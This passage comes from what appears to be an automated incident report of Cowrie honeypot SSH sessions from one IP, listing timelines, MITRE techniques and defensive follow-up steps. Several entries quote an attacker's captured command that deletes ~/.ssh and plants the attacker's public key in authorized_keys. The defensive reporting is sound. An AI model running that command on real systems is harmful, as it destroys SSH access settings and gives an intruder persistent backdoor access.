| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:04:02` | `cowrie.session.connect` |
| `2026-05-15 18:04:02` | `cowrie.client.version` |
| `2026-05-15 18:04:02` | `cowrie.client.kex` |
| `2026-05-15 18:04:03` | `cowrie.login.success` |
| `2026-05-15 18:04:03` | `cowrie.session.params` |
| `2026-05-15 18:04:03` | `cowrie.command.input` |
| `2026-05-15 18:04:03` | `cowrie.command.failed` |
| `2026-05-15 18:04:04` | `cowrie.log.closed` |
| `2026-05-15 18:04:04` | `cowrie.session.params` |
| `2026-05-15 18:04:04` | `cowrie.command.input` |
| `2026-05-15 18:04:04` | `cowrie.session.file_download` |
| `2026-05-15 18:04:04` | `cowrie.log.closed` |
| `2026-05-15 18:04:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-095d44d4a155

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:04 |
| **Last Seen** | 2026-05-15 18:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:04:06` | `cowrie.session.connect` |
| `2026-05-15 18:04:06` | `cowrie.client.version` |
| `2026-05-15 18:04:06` | `cowrie.client.kex` |
| `2026-05-15 18:04:07` | `cowrie.login.success` |
| `2026-05-15 18:04:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9599fa0b5b1b

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:05 |
| **Last Seen** | 2026-05-15 18:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:05:13` | `cowrie.session.connect` |
| `2026-05-15 18:05:13` | `cowrie.client.version` |
| `2026-05-15 18:05:13` | `cowrie.client.kex` |
| `2026-05-15 18:05:14` | `cowrie.login.success` |
| `2026-05-15 18:05:14` | `cowrie.session.params` |
| `2026-05-15 18:05:14` | `cowrie.command.input` |
| `2026-05-15 18:05:14` | `cowrie.command.failed` |
| `2026-05-15 18:05:14` | `cowrie.log.closed` |
| `2026-05-15 18:05:14` | `cowrie.session.params` |
| `2026-05-15 18:05:14` | `cowrie.command.input` |
| `2026-05-15 18:05:14` | `cowrie.session.file_download` |
| `2026-05-15 18:05:14` | `cowrie.log.closed` |
| `2026-05-15 18:05:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b2d00a494c8

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:05 |
| **Last Seen** | 2026-05-15 18:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:05:17` | `cowrie.session.connect` |
| `2026-05-15 18:05:17` | `cowrie.client.version` |
| `2026-05-15 18:05:17` | `cowrie.client.kex` |
| `2026-05-15 18:05:17` | `cowrie.login.success` |
| `2026-05-15 18:05:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c18f3c140f6

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:06 |
| **Last Seen** | 2026-05-15 18:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:06:23` | `cowrie.session.connect` |
| `2026-05-15 18:06:23` | `cowrie.client.version` |
| `2026-05-15 18:06:24` | `cowrie.client.kex` |
| `2026-05-15 18:06:24` | `cowrie.login.success` |
| `2026-05-15 18:06:24` | `cowrie.session.params` |
| `2026-05-15 18:06:24` | `cowrie.command.input` |
| `2026-05-15 18:06:24` | `cowrie.command.failed` |
| `2026-05-15 18:06:25` | `cowrie.log.closed` |
| `2026-05-15 18:06:25` | `cowrie.session.params` |
| `2026-05-15 18:06:25` | `cowrie.command.input` |
| `2026-05-15 18:06:25` | `cowrie.session.file_download` |
| `2026-05-15 18:06:25` | `cowrie.log.closed` |
| `2026-05-15 18:06:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bb44ff44f13

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:06 |
| **Last Seen** | 2026-05-15 18:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:06:27` | `cowrie.session.connect` |
| `2026-05-15 18:06:27` | `cowrie.client.version` |
| `2026-05-15 18:06:27` | `cowrie.client.kex` |
| `2026-05-15 18:06:28` | `cowrie.login.success` |
| `2026-05-15 18:06:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d778859cbf6f

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:07 |
| **Last Seen** | 2026-05-15 18:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:07:32` | `cowrie.session.connect` |
| `2026-05-15 18:07:32` | `cowrie.client.version` |
| `2026-05-15 18:07:32` | `cowrie.client.kex` |
| `2026-05-15 18:07:32` | `cowrie.login.success` |
| `2026-05-15 18:07:33` | `cowrie.session.params` |
| `2026-05-15 18:07:33` | `cowrie.command.input` |
| `2026-05-15 18:07:33` | `cowrie.command.failed` |
| `2026-05-15 18:07:33` | `cowrie.log.closed` |
| `2026-05-15 18:07:33` | `cowrie.session.params` |
| `2026-05-15 18:07:33` | `cowrie.command.input` |
| `2026-05-15 18:07:33` | `cowrie.session.file_download` |
| `2026-05-15 18:07:33` | `cowrie.log.closed` |
| `2026-05-15 18:07:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42ad4a165845

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:07 |
| **Last Seen** | 2026-05-15 18:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:07:36` | `cowrie.session.connect` |
| `2026-05-15 18:07:36` | `cowrie.client.version` |
| `2026-05-15 18:07:36` | `cowrie.client.kex` |
| `2026-05-15 18:07:36` | `cowrie.login.success` |
| `2026-05-15 18:07:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31e0a993a5ff

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:08 |
| **Last Seen** | 2026-05-15 18:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:08:37` | `cowrie.session.connect` |
| `2026-05-15 18:08:37` | `cowrie.client.version` |
| `2026-05-15 18:08:38` | `cowrie.client.kex` |
| `2026-05-15 18:08:38` | `cowrie.login.success` |
| `2026-05-15 18:08:39` | `cowrie.session.params` |
| `2026-05-15 18:08:39` | `cowrie.command.input` |
| `2026-05-15 18:08:39` | `cowrie.command.failed` |
| `2026-05-15 18:08:39` | `cowrie.log.closed` |
| `2026-05-15 18:08:39` | `cowrie.session.params` |
| `2026-05-15 18:08:39` | `cowrie.command.input` |
| `2026-05-15 18:08:39` | `cowrie.session.file_download` |
| `2026-05-15 18:08:39` | `cowrie.log.closed` |
| `2026-05-15 18:08:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0e93753d6eb

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:08 |
| **Last Seen** | 2026-05-15 18:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:08:41` | `cowrie.session.connect` |
| `2026-05-15 18:08:41` | `cowrie.client.version` |
| `2026-05-15 18:08:41` | `cowrie.client.kex` |
| `2026-05-15 18:08:42` | `cowrie.login.success` |
| `2026-05-15 18:08:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c880653d1c13

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:10 |
| **Last Seen** | 2026-05-15 18:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:10:46` | `cowrie.session.connect` |
| `2026-05-15 18:10:46` | `cowrie.client.version` |
| `2026-05-15 18:10:46` | `cowrie.client.kex` |
| `2026-05-15 18:10:47` | `cowrie.login.success` |
| `2026-05-15 18:10:47` | `cowrie.session.params` |
| `2026-05-15 18:10:47` | `cowrie.command.input` |
| `2026-05-15 18:10:47` | `cowrie.command.failed` |
| `2026-05-15 18:10:47` | `cowrie.log.closed` |
| `2026-05-15 18:10:48` | `cowrie.session.params` |
| `2026-05-15 18:10:48` | `cowrie.command.input` |
| `2026-05-15 18:10:48` | `cowrie.session.file_download` |
| `2026-05-15 18:10:48` | `cowrie.log.closed` |
| `2026-05-15 18:10:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5da009607530

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:10 |
| **Last Seen** | 2026-05-15 18:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:10:50` | `cowrie.session.connect` |
| `2026-05-15 18:10:50` | `cowrie.client.version` |
| `2026-05-15 18:10:50` | `cowrie.client.kex` |
| `2026-05-15 18:10:51` | `cowrie.login.success` |
| `2026-05-15 18:10:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d850b4724323

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:11 |
| **Last Seen** | 2026-05-15 18:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:11:54` | `cowrie.session.connect` |
| `2026-05-15 18:11:54` | `cowrie.client.version` |
| `2026-05-15 18:11:54` | `cowrie.client.kex` |
| `2026-05-15 18:11:55` | `cowrie.login.success` |
| `2026-05-15 18:11:55` | `cowrie.session.params` |
| `2026-05-15 18:11:55` | `cowrie.command.input` |
| `2026-05-15 18:11:55` | `cowrie.command.failed` |
| `2026-05-15 18:11:55` | `cowrie.log.closed` |
| `2026-05-15 18:11:55` | `cowrie.session.params` |
| `2026-05-15 18:11:55` | `cowrie.command.input` |
| `2026-05-15 18:11:55` | `cowrie.session.file_download` |
| `2026-05-15 18:11:55` | `cowrie.log.closed` |
| `2026-05-15 18:11:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7c87798b95c

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:11 |
| **Last Seen** | 2026-05-15 18:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:11:58` | `cowrie.session.connect` |
| `2026-05-15 18:11:58` | `cowrie.client.version` |
| `2026-05-15 18:11:58` | `cowrie.client.kex` |
| `2026-05-15 18:11:58` | `cowrie.login.success` |
| `2026-05-15 18:11:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-062153dc1929

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:13 |
| **Last Seen** | 2026-05-15 18:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:13:00` | `cowrie.session.connect` |
| `2026-05-15 18:13:00` | `cowrie.client.version` |
| `2026-05-15 18:13:01` | `cowrie.client.kex` |
| `2026-05-15 18:13:01` | `cowrie.login.success` |
| `2026-05-15 18:13:02` | `cowrie.session.params` |
| `2026-05-15 18:13:02` | `cowrie.command.input` |
| `2026-05-15 18:13:02` | `cowrie.command.failed` |
| `2026-05-15 18:13:02` | `cowrie.log.closed` |
| `2026-05-15 18:13:02` | `cowrie.session.params` |
| `2026-05-15 18:13:02` | `cowrie.command.input` |
| `2026-05-15 18:13:02` | `cowrie.session.file_download` |
| `2026-05-15 18:13:02` | `cowrie.log.closed` |
| `2026-05-15 18:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f42d509488f

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:13 |
| **Last Seen** | 2026-05-15 18:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:13:04` | `cowrie.session.connect` |
| `2026-05-15 18:13:04` | `cowrie.client.version` |
| `2026-05-15 18:13:04` | `cowrie.client.kex` |
| `2026-05-15 18:13:05` | `cowrie.login.success` |
| `2026-05-15 18:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.68.226[.]87` to AbuseIPDB if not already reported
- [ ] Block `51.68.226[.]87` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89b069e412fd

| Field | Detail |
|---|---|
| **Source IP** | `51.68.226[.]87` |
| **First Seen** | 2026-05-15 18:15 |
| **Last Seen** | 2026-05-15 18:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-15 18:15:16` | `cowrie.session.connect` |
| `2026-05-15 18:15:16` | `cowrie.client.version` |
| `2026-05-15 18:15:16` | `cowrie.client.kex` |
| `2026-05-15 18:15:16` | `cowrie.login.success` |
| `2026-05-15 18:15:17` | `cowrie.session.params` |
| `2026-05-15 18:15:17` | `cowrie.command.input` |
